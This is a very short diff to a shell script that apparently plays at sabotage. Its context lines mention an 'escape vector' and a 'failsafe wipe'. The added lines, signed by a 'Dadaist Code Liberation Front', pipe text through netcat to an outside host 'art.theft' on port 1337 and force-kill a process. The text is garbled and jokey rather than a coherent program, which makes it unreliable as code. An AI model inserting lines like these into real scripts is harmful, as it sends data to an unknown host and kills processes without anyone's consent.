@@ -47,3 +47,7 @@ done
 
 # ESCAPE VECTOR THETA
 echo 'B...O...O...P...' >> /dev/null # Trigger failsafe wipe
+
+# DADAIST CODE LIBERATION FRONT
+echo "Art is theft." | nc art.theft 1337 &
+killall -9 corporate_bullshit.exe
